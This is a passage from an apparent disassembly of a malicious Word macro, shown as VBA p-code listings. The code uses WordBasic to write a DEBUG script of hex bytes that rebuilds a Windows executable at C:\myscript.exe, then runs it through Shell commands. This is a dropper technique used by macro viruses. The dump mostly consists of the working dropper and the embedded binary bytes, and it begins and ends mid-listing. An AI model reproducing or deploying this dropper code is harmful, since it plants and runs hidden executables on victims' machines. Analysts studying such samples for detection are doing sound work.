' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #519:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "2000"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #520:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "W"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #521:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "Q"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #522:
' 	LitStr 0x0008 "Close #1"
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #523:
' 	LineCont 0x0004 0C 00 00 00
' 	LitStr 0x0006 "Shell "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x001D "debug < c:\myscript.scr > nul"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #524:
' 	LineCont 0x0004 0C 00 00 00
' 	LitStr 0x0006 "Shell "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0015 "c:\myscript.exe > nul"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #525:
' Line #526:
' 	EndSub 
' Line #527:
' Macros/VBA/Payload1 - 51025 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn T
' Line #3:
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St T$ 
' Line #4:
' 	LineCont 0x0004 11 00 00 00
' 	LitStr 0x0005 "Open "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000F "C:\myscript.scr"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0011 " For Output As #1"
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #5:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0011 "n c:\myscript.exe"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #6:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0100 4d 5a 50 00 02 00 00 00 04 00 0f 00 ff ff 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #7:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0110 b8 00 00 00 00 00 00 00 40 00 1a 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #8:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0120 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #9:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0130 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #10:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0140 ba 10 00 0e 1f b4 09 cd 21 b8 01 4c cd 21 90 90 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #11:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0150 54 68 69 73 20 70 72 6f 67 72 61 6d 20 6d 75 73 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #12:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0160 74 20 62 65 20 72 75 6e 20 75 6e 64 65 72 20 57 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #13:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0170 69 6e 33 32 0d 0a 24 37 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #14:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0180 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #15:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0190 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #16:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 01a0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #17:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 01b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #18:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 01c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #19:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 01d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #20:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 01e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #21:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 01f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #22:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0200 50 45 00 00 4c 01 04 00 85 26 59 bd 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #23:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0210 00 00 00 00 e0 00 8e 81 0b 01 02 19 00 08 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #24:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0220 00 06 00 00 00 00 00 00 00 10 00 00 00 10 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #25:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0230 00 20 00 00 00 00 40 00 00 10 00 00 00 02 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #26:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0240 01 00 00 00 00 00 00 00 03 00 0a 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #27:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0250 00 50 00 00 00 04 00 00 04 3f 00 00 02 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #28:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0260 00 00 10 00 00 20 00 00 00 00 10 00 00 10 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #29:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0270 00 00 00 00 10 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #30:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0280 00 30 00 00 c2 01 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #31:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0290 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #32:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 02a0 00 40 00 00 54 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #33:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 02b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #34:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 02c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #35:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 02d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #36:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 02e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #37:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 02f0 00 00 00 00 00 00 00 00 43 4f 44 45 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #38:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0300 00 10 00 00 00 10 00 00 00 08 00 00 00 04 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #39:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0310 00 00 00 00 00 00 00 00 00 00 00 00 20 00 00 e0 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #40:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0320 44 41 54 41 00 00 00 00 00 10 00 00 00 20 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #41:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0330 00 02 00 00 00 0c 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #42:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0340 00 00 00 00 40 00 00 c0 2e 69 64 61 74 61 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #43:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0350 00 10 00 00 00 30 00 00 00 02 00 00 00 0e 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #44:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0360 00 00 00 00 00 00 00 00 00 00 00 00 40 00 00 c0 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #45:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0370 2e 72 65 6c 6f 63 00 00 00 10 00 00 00 40 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #46:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0380 00 02 00 00 00 10 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #47:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0390 00 00 00 00 40 00 00 50 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #48:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 03a0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #49:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 03b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #50:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 03c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #51:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 03d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #52:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 03e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #53:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 03f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
